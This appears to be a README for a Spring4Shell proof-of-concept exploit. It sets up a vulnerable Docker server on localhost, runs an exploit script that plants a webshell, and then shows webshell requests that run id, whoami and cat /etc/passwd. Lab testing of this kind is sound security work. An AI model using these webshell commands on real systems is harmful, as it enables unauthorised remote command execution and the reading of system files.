# Spring4Shell PoC

## This is for testing purpose
### Setup the vulnerable server 
Setup you vulnerable server
```sh
docker run -td -p 8080:8080 jieliau/spring4shell
```
And open up the browser, connect to following address:
```sh
http://127.0.0.1:8080/helloworld/greeting
```
Now, your vulnerable server is ready
### Usage
```sh
$ python3 exploit.py --url "http://127.0.0.1:8080/helloworld/greeting"
```
After above, websehll will be put on the server, you can use the following to execute the command to get id or /etc/passwd
```sh
$ http://127.0.0.1:8080/webshell.jsp?cmd=id
$ http://127.0.0.1:8080/webshell.jsp?cmd=cat%20/etc/passwd
$ http://127.0.0.1:8080/webshell.jsp?cmd=whoami
```
